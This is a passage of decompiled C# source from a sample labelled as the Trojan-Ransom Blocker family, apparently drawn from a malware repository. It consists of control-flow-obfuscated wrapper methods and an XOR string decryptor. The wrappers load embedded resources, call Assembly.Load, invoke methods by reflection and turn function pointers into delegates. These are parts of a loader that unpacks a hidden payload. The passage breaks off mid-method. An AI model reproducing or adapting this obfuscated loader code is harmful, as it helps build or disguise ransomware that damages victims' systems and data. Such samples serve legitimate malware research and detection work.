// Decompiled with JetBrains decompiler
// Type: Ⴃ.ႰႨ
// Assembly: 2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 74BDD15D-12B6-4AF6-A414-BF46F9B2B38E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bgnp-2d8181bdd44db6a6cf6e7140f578a36b2a17d8c04a2d26d38e122e42ecc24c28.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Text;
using System.Threading;

namespace Ⴃ
{
  internal sealed class ႰႨ
  {
    static ႰႨ() => Ⴃ.ႰႰ.ႨႤ();

    internal static AppDomain Ⴗ([In] int obj0, [In] int obj1)
    {
label_3:
      int num1;
      switch (obj1 ^ obj0)
      {
        case 80:
          num1 = 5;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 6:
            goto label_3;
          case 1:
          case 5:
            goto label_8;
          case 2:
          case 4:
            num2 = 6;
            continue;
          case 3:
            num2 = 6;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.Ⴗ);
            num2 = 6;
            continue;
        }
      }
label_8:
      return AppDomain.CurrentDomain;
    }

    internal static long Ⴐ([In] Stream obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 51:
          num1 = 4;
          break;
        case 52:
          num1 = 2;
          break;
        default:
          num1 = 1;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
            num2 = 6;
            continue;
          case 1:
            num2 = 6;
            continue;
          case 2:
          case 8:
            goto label_10;
          case 3:
          case 4:
            goto label_9;
          case 6:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.Ⴐ);
            num2 = 6;
            continue;
        }
      }
label_9:
      return obj0.Length;
label_10:
      return obj0.Length;
    }

    internal static void Ⴀ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
    {
      int num1 = 0;
      while (true)
      {
        switch (num1)
        {
          case 2:
            goto label_7;
          case 3:
            num1 = 0;
            continue;
          case 4:
            goto label_9;
          case 5:
            goto label_10;
          default:
            int num2;
            switch (obj5 ^ obj4)
            {
              case 17:
                num2 = 2;
                break;
              case 18:
                goto label_8;
              default:
                num2 = 3;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_9:
      return;
label_10:
      return;
label_7:
      obj0.Write(obj1, obj2, obj3);
      return;
label_8:
      obj0.Write(obj1, obj2, obj3);
    }

    internal static void Ⴈ([In] Array obj0, [In] RuntimeFieldHandle obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 0;
      while (true)
      {
        switch (num1)
        {
          case 1:
          case 2:
            num1 = 0;
            continue;
          case 3:
            goto label_7;
          case 5:
            goto label_8;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 32:
                num2 = 3;
                break;
              default:
                num2 = 1;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      RuntimeHelpers.InitializeArray(obj0, obj1);
    }

    internal static void Ⴃ([In] object obj0, [In] int obj1, [In] int obj2)
    {
      int num1 = 4;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_7;
          case 2:
          case 3:
          case 5:
            num1 = 4;
            continue;
          default:
            int num2;
            switch (obj2 ^ obj1)
            {
              case 62:
                num2 = 0;
                break;
              default:
                num2 = 3;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      Monitor.Enter(obj0);
    }

    internal static string Ⴍ([In] string obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 119:
          num1 = 4;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
            goto label_3;
          case 2:
          case 6:
            num2 = 1;
            continue;
          case 3:
            num2 = 1;
            continue;
          case 4:
          case 5:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.Ⴍ);
            num2 = 1;
            continue;
        }
      }
label_8:
      return obj0 + obj1;
    }

    internal static Assembly Ⴅ(
      [In] byte[] obj0,
      [In] byte[] obj1,
      [In] Evidence obj2,
      [In] int obj3,
      [In] int obj4)
    {
label_3:
      int num1;
      switch (obj4 ^ obj3)
      {
        case 124:
          num1 = 0;
          break;
        default:
          num1 = 2;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_8;
          case 1:
          case 6:
          case 7:
            goto label_3;
          case 2:
          case 5:
            num2 = 7;
            continue;
          case 4:
            num2 = 7;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.Ⴅ);
            num2 = 7;
            continue;
        }
      }
label_8:
      return Assembly.Load(obj0, obj1, obj2);
    }

    internal static object Ⴄ([In] object obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 117:
          num1 = 5;
          break;
        default:
          num1 = 1;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 6:
            goto label_3;
          case 1:
            num2 = 6;
            continue;
          case 3:
          case 5:
            goto label_8;
          case 4:
            num2 = 6;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.Ⴄ);
            num2 = 6;
            continue;
        }
      }
label_8:
      return RuntimeHelpers.GetObjectValue(obj0);
    }

    internal static object Ⴓ([In] AppDomain obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 71:
          num1 = 5;
          break;
        default:
          num1 = 4;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
            goto label_3;
          case 2:
          case 5:
            goto label_8;
          case 4:
            num2 = 0;
            continue;
          case 6:
            num2 = 0;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.Ⴓ);
            num2 = 0;
            continue;
        }
      }
label_8:
      return obj0.GetData(obj1);
    }

    internal static object Ⴜ([In] MethodBase obj0, [In] object obj1, [In] object[] obj2, [In] int obj3, [In] int obj4)
    {
label_3:
      int num1;
      switch (obj4 ^ obj3)
      {
        case 97:
          num1 = 4;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 3:
            num2 = 7;
            continue;
          case 4:
            goto label_8;
          case 6:
            num2 = 7;
            continue;
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.Ⴜ);
            num2 = 7;
            continue;
        }
      }
label_8:
      return obj0.Invoke(obj1, obj2);
    }

    internal static ParameterInfo[] ႰႷ([In] MethodBase obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 93:
          num1 = 0;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
            goto label_8;
          case 1:
            goto label_3;
          case 2:
          case 7:
            num2 = 1;
            continue;
          case 4:
          case 6:
            num2 = 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႷ);
            num2 = 1;
            continue;
        }
      }
label_8:
      return obj0.GetParameters();
    }

    internal static short ႰႰ([In] byte[] obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 98:
          num1 = 5;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
            num2 = 2;
            continue;
          case 2:
          case 6:
            goto label_3;
          case 3:
            num2 = 2;
            continue;
          case 5:
          case 7:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႰ);
            num2 = 2;
            continue;
        }
      }
label_8:
      return BitConverter.ToInt16(obj0, obj1);
    }

    internal static string ႰႠ([In] string obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 66:
          num1 = 1;
          break;
        default:
          num1 = 6;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 1:
          case 2:
          case 3:
          case 5:
            goto label_8;
          case 6:
            num2 = 0;
            continue;
          case 7:
            num2 = 0;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႠ);
            num2 = 0;
            continue;
        }
      }
label_8:
      return string.Intern(obj0);
    }

    internal static AppDomain ႰႨ([In] int obj0, [In] int obj1)
    {
label_3:
      int num1;
      switch (obj1 ^ obj0)
      {
        case 38:
          num1 = 3;
          break;
        default:
          num1 = 5;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
            num2 = 2;
            continue;
          case 1:
          case 3:
          case 7:
            goto label_8;
          case 2:
            goto label_3;
          case 5:
            num2 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႨ);
            num2 = 2;
            continue;
        }
      }
label_8:
      return AppDomain.CurrentDomain;
    }

    internal static int ႰႣ([In] ref Color obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 109:
          num1 = 6;
          break;
        default:
          num1 = 1;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 2;
            continue;
          case 1:
            num2 = 2;
            continue;
          case 2:
            goto label_3;
          case 4:
          case 5:
          case 6:
          case 7:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႣ);
            num2 = 2;
            continue;
        }
      }
label_8:
      return obj0.ToArgb();
    }

    internal static void ႰႭ(
      [In] Array obj0,
      [In] int obj1,
      [In] Array obj2,
      [In] int obj3,
      [In] int obj4,
      [In] int obj5,
      [In] int obj6)
    {
      int num1 = 3;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 5:
            goto label_7;
          case 1:
          case 2:
            num1 = 3;
            continue;
          case 4:
            goto label_8;
          default:
            int num2;
            switch (obj6 ^ obj5)
            {
              case 31:
                num2 = 5;
                break;
              default:
                num2 = 1;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      Buffer.BlockCopy(obj0, obj1, obj2, obj3, obj4);
    }

    internal static Color ႰႤ([In] int obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 45:
          num1 = 0;
          break;
        default:
          num1 = 5;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_8;
          case 1:
          case 5:
            num2 = 6;
            continue;
          case 3:
          case 6:
            goto label_3;
          case 7:
            num2 = 6;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႤ);
            num2 = 6;
            continue;
        }
      }
label_8:
      return Color.FromArgb(obj0);
    }

    internal static void ႰႳ([In] Exception obj0, [In] int obj1, [In] int obj2)
    {
      int num1 = 5;
      while (true)
      {
        switch (num1)
        {
          case 1:
            num1 = 5;
            continue;
          case 3:
          case 4:
            goto label_7;
          default:
            int num2;
            switch (obj2 ^ obj1)
            {
              case 12:
                num2 = 3;
                break;
              default:
                num2 = 1;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      ProjectData.SetProjectError(obj0);
    }

    internal static int ႰႼ([In] string obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 64:
          num1 = 4;
          break;
        default:
          num1 = 1;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 7:
            goto label_3;
          case 1:
            num2 = 0;
            continue;
          case 2:
          case 5:
            num2 = 0;
            continue;
          case 3:
          case 4:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႼ);
            num2 = 0;
            continue;
        }
      }
label_8:
      return obj0.Length;
    }

    internal sealed class ႰႥ
    {
      internal static int Ⴀ([In] Stream obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 79:
            num1 = 3;
            break;
          case 80:
            num1 = 1;
            break;
          default:
            num1 = 2;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 1:
            case 7:
              goto label_10;
            case 2:
              num2 = 5;
              continue;
            case 3:
            case 6:
              goto label_9;
            case 5:
              goto label_3;
            case 8:
              num2 = 5;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႥ.Ⴀ);
              num2 = 5;
              continue;
          }
        }
label_9:
        return obj0.ReadByte();
label_10:
        return obj0.ReadByte();
      }

      internal static byte[] Ⴓ([In] MemoryStream obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 110:
            num1 = 5;
            break;
          default:
            num1 = 2;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 1:
            case 5:
              goto label_8;
            case 2:
              num2 = 7;
              continue;
            case 3:
            case 6:
              num2 = 7;
              continue;
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႥ.Ⴓ);
              num2 = 7;
              continue;
          }
        }
label_8:
        return obj0.ToArray();
      }

      internal static string Ⴄ([In] Encoding obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
      {
label_3:
        int num1;
        switch (obj3 ^ obj2)
        {
          case 47:
            num1 = 6;
            break;
          default:
            num1 = 3;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 1:
              num2 = 5;
              continue;
            case 2:
            case 6:
              goto label_8;
            case 3:
              num2 = 5;
              continue;
            case 5:
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႥ.Ⴄ);
              num2 = 5;
              continue;
          }
        }
label_8:
        return obj0.GetString(obj1);
      }

      internal static byte Ⴗ([In] ref Color obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 109:
            num1 = 9;
            break;
          case 110:
            num1 = 0;
            break;
          case 111:
            num1 = 2;
            break;
          default:
            num1 = 1;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 4:
              goto label_11;
            case 1:
              num2 = 6;
              continue;
            case 2:
              goto label_12;
            case 5:
            case 7:
            case 9:
              goto label_10;
            case 6:
              goto label_3;
            case 8:
              num2 = 6;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႥ.Ⴗ);
              num2 = 6;
              continue;
          }
        }
label_10:
        return obj0.A;
label_11:
        return obj0.G;
label_12:
        return obj0.R;
      }

      internal static string[] Ⴃ([In] string obj0, [In] char[] obj1, [In] int obj2, [In] int obj3)
      {
label_3:
        int num1;
        switch (obj3 ^ obj2)
        {
          case 58:
            num1 = 4;
            break;
          default:
            num1 = 2;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 1:
              num2 = 5;
              continue;
            case 2:
              num2 = 5;
              continue;
            case 4:
            case 7:
              goto label_8;
            case 5:
            case 6:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႥ.Ⴃ);
              num2 = 5;
              continue;
          }
        }
label_8:
        return obj0.Split(obj1);
      }

      internal static Type Ⴈ([In] RuntimeTypeHandle obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 126:
            num1 = 3;
            break;
          default:
            num1 = 6;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_3;
            case 3:
              goto label_8;
            case 4:
              num2 = 0;
              continue;
            case 6:
            case 7:
              num2 = 0;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႥ.Ⴈ);
              num2 = 0;
              continue;
          }
        }
label_8:
        return Type.GetTypeFromHandle(obj0);
      }

      internal static Color Ⴅ([In] int obj0, [In] int obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
      {
label_3:
        int num1;
        switch (obj5 ^ obj4)
        {
          case 62:
            num1 = 3;
            break;
          default:
            num1 = 4;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_3;
            case 1:
            case 3:
              goto label_8;
            case 4:
            case 6:
            case 7:
              num2 = 0;
              continue;
            case 5:
              num2 = 0;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႥ.Ⴅ);
              num2 = 0;
              continue;
          }
        }
label_8:
        return Color.FromArgb(obj0, obj1, obj2, obj3);
      }

      internal static bool Ⴐ([In] DateTime obj0, [In] DateTime obj1, [In] int obj2, [In] int obj3)
      {
label_3:
        int num1;
        switch (obj3 ^ obj2)
        {
          case 99:
            num1 = 3;
            break;
          default:
            num1 = 1;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
            case 7:
              goto label_8;
            case 1:
              num2 = 4;
              continue;
            case 2:
              num2 = 4;
              continue;
            case 4:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႥ.Ⴐ);
              num2 = 4;
              continue;
          }
        }
label_8:
        return obj0 > obj1;
      }

      internal static Delegate Ⴍ([In] IntPtr obj0, [In] Type obj1, [In] int obj2, [In] int obj3)
      {
label_3:
        int num1;
        switch (obj3 ^ obj2)
        {
          case 107:
            num1 = 0;
            break;
          default:
            num1 = 1;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_8;
            case 1:
              num2 = 4;
              continue;
            case 2:
            case 5:
              num2 = 4;
              continue;
            case 3:
            case 4:
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႥ.Ⴍ);
              num2 = 4;
              continue;
          }
        }
label_8:
        return Marshal.GetDelegateForFunctionPointer(obj0, obj1);
      }

      internal static bool Ⴜ([In] string obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 68:
            num1 = 1;
            break;
          default:
            num1 = 6;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
            case 5:
              num2 = 7;
              continue;
            case 1:
            case 2:
              goto label_8;
            case 6:
              num2 = 7;
              continue;
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႥ.Ⴜ);
              num2 = 7;
              continue;
          }
        }
label_8:
        return Directory.Exists(obj0);
      }

      internal sealed class ႰႭ
      {
        private static readonly char[] Ⴀ;
        private static readonly char[] Ⴍ;
        private static readonly string[] Ⴅ;
        internal static Ⴃ.ႰႨ.ႰႥ.ႰႭ.Ⴐ Ⴗ;

        static ႰႭ()
        {
          int num = 1;
          char[] chArray;
          while (true)
          {
            switch (num)
            {
              case 0:
                chArray[0] = '㜢';
                num = 4;
                continue;
              case 2:
                num = 3;
                continue;
              case 3:
                chArray[6] = '㨽';
                chArray[5] = 'ᅐ';
                goto case 0;
              case 4:
                goto label_8;
              case 5:
                chArray[7] = '㻷';
                chArray[3] = 'ၜ';
                goto case 2;
              case 6:
                chArray[4] = 'ჶ';
                goto case 5;
              default:
                Ⴃ.ႰႨ.ႰႥ.ႰႭ.Ⴍ = new char[43]
                {
                  char.MinValue,
                  '(',
                  char.MinValue,
                  '㝧',
                  '\u3193',
                  'ѥ',
                  'ၪ',
                  'Ⴓ',
                  'ᅧ',
                  '㨈',
                  '㻆',
                  '㝣',
                  '\u31E6',
                  'А',
                  'ၩ',
                  'Ⴕ',
                  'ᄕ',
                  '㨄',
                  '㻆',
                  '㝣',
                  '\u3192',
                  'Й',
                  'ၪ',
                  'Ⴥ',
                  'ᄕ',
                  '㩼',
                  '㺳',
                  '㜑',
                  '㇠',
                  'Д',
                  'ယ',
                  '\u10C6',
                  'ᅡ',
                  '㩻',
                  '㺱',
                  '㜕',
                  '\u3194',
                  'Й',
                  'သ',
                  'Ⴗ',
                  'ᅥ',
                  '㩸',
                  '㺵'
                };
                chArray = new char[8]
                {
                  char.MinValue,
                  char.MinValue,
                  'С',
                  char.MinValue,
                  char.MinValue,
                  char.MinValue,
                  char.MinValue,
                  char.MinValue
                };
                num = 6;
                continue;
            }
          }
label_8:
          chArray[1] = '㇖';
          Ⴃ.ႰႨ.ႰႥ.ႰႭ.Ⴅ = new string[1];
          Ⴃ.ႰႨ.ႰႥ.ႰႭ.Ⴀ = chArray;
        }

        internal static string Ⴃ([In] int obj0, [In] int obj1)
        {
label_3:
          int index1 = obj0 ^ 1311828761 ^ obj1;
          char[] ⴍ = Ⴃ.ႰႨ.ႰႥ.ႰႭ.Ⴍ;
          int index2 = (int) ⴍ[index1];
          int num1 = 6;
          string str1;
          int length1;
          char[] chArray;
          char[] ⴀ;
          int length2;
          int index3;
          while (true)
          {
            switch (num1)
            {
              case 1:
                num1 = 7;
                continue;
              case 2:
              case 11:
                goto label_14;
              case 3:
                chArray = new char[length1];
                ⴀ = Ⴃ.ႰႨ.ႰႥ.ႰႭ.Ⴀ;
                length2 = ⴀ.Length;
                index1 += 3;
                goto case 10;
              case 4:
                goto label_5;
              case 5:
                goto label_3;
              case 6:
                num1 = (str1 = Ⴃ.ႰႨ.ႰႥ.ႰႭ.Ⴅ[index2]) == null ? 13 : 4;
                continue;
              case 7:
                num1 = index3 < length1 ? 8 : 2;
                continue;
              case 8:
                chArray[index3] = (char) ((uint) ⴍ[index1 + index3] ^ (uint) ⴀ[(index3 + index2) % length2]);
                num1 = 9;
                continue;
              case 9:
                index3 = 1 + index3;
                num1 = 7;
                continue;
              case 10:
                num1 = 12;
                continue;
              case 12:
                index3 = 0;
                goto case 1;
              case 13:
                int num2 = (int) ⴍ[index1 + 1];
                length1 = ((int) ⴍ[index1 + 2] << 16) + num2;
                num1 = 3;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႥ.ႰႭ.Ⴃ);
                num1 = 5;
                continue;
            }
          }
label_5:
          return str1;
label_14:
          string str2 = new string(chArray);
          Ⴃ.ႰႨ.ႰႥ.ႰႭ.Ⴅ[index2] = str2;
          return str2;
        }

        internal static object Ⴈ([In] AppDomain obj0, [In] string obj1, [In] int obj2, [In] int obj3)
        {
label_3:
          int num1;
          switch (obj3 ^ obj2)
          {
            case 56:
              num1 = 1;
              break;
            default:
              num1 = 7;
              break;
          }
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 5:
                num2 = 3;
                continue;
              case 1:
                goto label_8;
              case 3:
                goto label_3;
              case 4:
              case 6:
              case 7:
                num2 = 3;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႥ.ႰႭ.Ⴈ);
                num2 = 3;
                continue;
            }
          }
label_8:
          return obj0.GetData(obj1);
        }

        internal static void Ⴓ([In] AppDomain obj0, [In] string obj1, [In] object obj2, [In] int obj3, [In] int obj4)
        {
          int num1 = 1;
          while (true)
          {
            switch (num1)
            {
              case 0:
              case 2:
                num1 = 1;
                continue;
              case 3:
              case 4:
              case 5:
                goto label_7;
              default:
                int num2;
                switch (obj4 ^ obj3)
                {
                  case 122:
                    num2 = 4;
                    break;
                  default:
                    num2 = 2;
                    break;
                }
                num1 = num2;
                continue;
            }
          }
label_7:
          obj0.SetData(obj1, obj2);
        }

        internal static Assembly Ⴄ([In] int obj0, [In] int obj1)
        {
label_3:
          int num1;
          switch (obj1 ^ obj0)
          {
            case 38:
              num1 = 7;
              break;
            default:
              num1 = 2;
              break;
          }
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
                goto label_3;
              case 1:
              case 5:
              case 7:
                goto label_8;
              case 2:
              case 4:
                num2 = 0;
                continue;
              case 6:
                num2 = 0;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႥ.ႰႭ.Ⴄ);
                num2 = 0;
                continue;
            }
          }
label_8:
          return Assembly.GetExecutingAssembly();
        }

        internal static Stream Ⴜ([In] Assembly obj0, [In] string obj1, [In] int obj2, [In] int obj3)
        {
label_3:
          int num1;
          switch (obj3 ^ obj2)
          {
            case 116:
              num1 = 6;
              break;
            default:
              num1 = 0;
              break;
          }
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 2:
              case 3:
                num2 = 4;
                continue;
              case 1:
                num2 = 4;
                continue;
              case 4:
                goto label_3;
              case 6:
              case 7:
                goto label_8;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႥ.ႰႭ.Ⴜ);
                num2 = 4;
                continue;
            }
          }
label_8:
          return obj0.GetManifestResourceStream(obj1);
        }

        internal static byte[] ႠႣ([In] MemoryStream obj0, [In] int obj1, [In] int obj2)
        {
label_3:
          int num1;
          switch (obj2 ^ obj1)
          {
            case 31:
              num1 = 1;
              break;
            default:
              num1 = 2;
              break;
          }
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 1:
                goto label_8;
              case 2:
              case 3:
                num2 = 6;
                continue;
              case 4:
              case 5:
              case 7:
                num2 = 6;
                continue;
              case 6:
                goto label_3;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႥ.ႰႭ.ႠႣ);
                num2 = 6;
                continue;
            }
          }
label_8:
          return obj0.ToArray();
        }

        internal static char ႠႠ([In] string obj0, [In] int obj1, [In] int obj2, [In] int obj3)
        {
label_3:
          int num1;
          switch (obj3 ^ obj2)
          {
            case 23:
              num1 = 1;
              break;
            default:
              num1 = 0;
              break;
          }
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 3:
                num2 = 6;
                continue;
              case 1:
                goto label_8;
              case 2:
              case 4:
              case 7:
                num2 = 6;
                continue;
              case 6:
                goto label_3;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႥ.ႰႭ.ႠႠ);
                num2 = 6;
                continue;
            }
          }
label_8:
          return obj0[obj1];
        }

        internal static Stream ႠႭ([In] Assembly obj0, [In] string obj1, [In] int obj2, [In] int obj3)
        {
label_3:
          int num1;
          switch (obj3 ^ obj2)
          {
            case 79:
              num1 = 6;
              break;
            default:
              num1 = 0;
              break;
          }
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 1:
                num2 = 2;
                continue;
              case 2:
                goto label_3;
              case 5:
              case 7:
                num2 = 2;
                continue;
              case 6:
                goto label_8;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႥ.ႰႭ.ႠႭ);
                num2 = 2;
                continue;
            }
          }
label_8:
          return obj0.GetManifestResourceStream(obj1);
        }

        internal static int ႠႥ([In] ref IntPtr obj0, [In] int obj1, [In] int obj2)
        {
label_3:
          int num1;
          switch (obj2 ^ obj1)
          {
            case 95:
              num1 = 7;
              break;
            default:
              num1 = 0;
              break;
          }
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
                num2 = 2;
                continue;
              case 1:
              case 3:
              case 6:
                num2 = 2;
                continue;
              case 2:
              case 4:
                goto label_3;
              case 7:
                goto label_8;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.ႰႨ.ႰႥ.ႰႭ.ႠႥ);
                num2 = 2;
                continue;
            }
          }
label_8:
          return obj0.ToInt32();
        }

        internal static void ႠႰ([In] AppDomain obj0, [In] string obj1, [In] object obj2, [In] int obj3, [In] int obj4)
        {
          int num1 = 4;
          while (true)
          {
            switch (num1)
            {
              case 0:
              case 2:
                num1 = 4;
                continue;
              case 3:
                goto label_7;
              default:
                int num2;
                switch (obj4 ^ obj3)
                {
                  case 36:
                    num2 = 3;
